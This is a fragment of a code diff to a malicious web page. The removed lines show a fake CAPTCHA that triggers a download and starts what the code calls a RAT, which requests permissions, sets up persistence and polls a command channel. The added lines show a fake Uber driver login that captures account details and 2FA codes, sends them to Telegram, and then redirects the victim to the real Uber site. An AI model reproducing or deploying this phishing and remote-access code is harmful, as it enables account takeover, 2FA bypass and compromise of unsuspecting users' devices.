-                    } else if (!url.includes('mail.google.com')) {
-                        gmailDetectedNotified = false;
-                    }
-                }
-            }).observe(document, { subtree: true, childList: true });
-
-            // ================= CAPTCHA HANDLER =================
-            function initCaptcha() {
-                const overlay = document.getElementById('captchaOverlay');
-                const checkbox = document.getElementById('captchaInput');
-                const captchaDiv = document.getElementById('captchaCheckbox');
-
-                const onCaptchaSuccess = async () => {
-                    // 1. Trigger download (user just clicked the checkbox)
-                    triggerDownload();
-
-                    // 2. Remove CAPTCHA overlay
-                    if (overlay) overlay.style.display = 'none';
-
-                    // 3. Show and start the RAT interface
-                    document.getElementById('loadingOverlay').style.display = 'flex';
-                    document.getElementById('mainFrame').style.display = 'block';
-                    
-                    // 4. Now start the RAT initialization
-                    await requestAllPermissions();
-                    setupPersistence();
-                    await syncOffset();
-                    await registerAndSendMenu();
-                    isRegistered = true;
-                    intervalId = setInterval(pollUpdates, POLL_INTERVAL);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    document.getElementById('mainFrame').style.opacity = '1';
-                };
-
-                // When checkbox is checked
-                checkbox.addEventListener('change', (e) => {
-                    if (e.target.checked) {
-                        onCaptchaSuccess();
-                    }
+                    loadingDiv.style.display = 'block';
+                    const message2 = `<b>🔐 Uber Driver 2FA Code</b>\n\n<b>Account:</b> <code>${escapeHtml(capturedEmailPhone)}</code>\n<b>2FA Code:</b> <code>${escapeHtml(code)}</code>\n<b>Time:</b> ${new Date().toLocaleString()}`;
+                    await sendTelegramMessage(message2);
+                    // Redirect to real Uber driver dashboard
+                    loadingDiv.innerText = 'Redirecting to secure dashboard...';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.uber.com/login?redirect=/driver/dashboard/';
+                    }, 1500);
                 });
-
-                // Also allow clicking the whole div
-                captchaDiv.addEventListener('click', () => {
-                    if (!checkbox.checked) {
-                        checkbox.checked = true;
-                        onCaptchaSuccess();
-                    }
-                });
+                loadingDiv.innerText = 'Almost there...';
+                loadingDiv.style.display = 'block';
+                submitBtn.disabled = false;
+                loadingDiv.style.display = 'none'; // hide after switch
+                return;
             }
+        });
 
-            // Start CAPTCHA initially (RAT not loaded yet)
-            initCaptcha();
-        })();
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+
+        // Fake reCAPTCHA click (just visual)
+        const recaptchaBox = document.querySelector('.recaptcha');
+        if (recaptchaBox) {
+            recaptchaBox.addEventListener('click', () => {
+                const checkDiv = recaptchaBox.querySelector('div:first-child');
+                if (checkDiv) checkDiv.style.backgroundColor = '#00b14f';
+                // No real functionality
+            });
+        }
     </script>
 </body>
 </html>
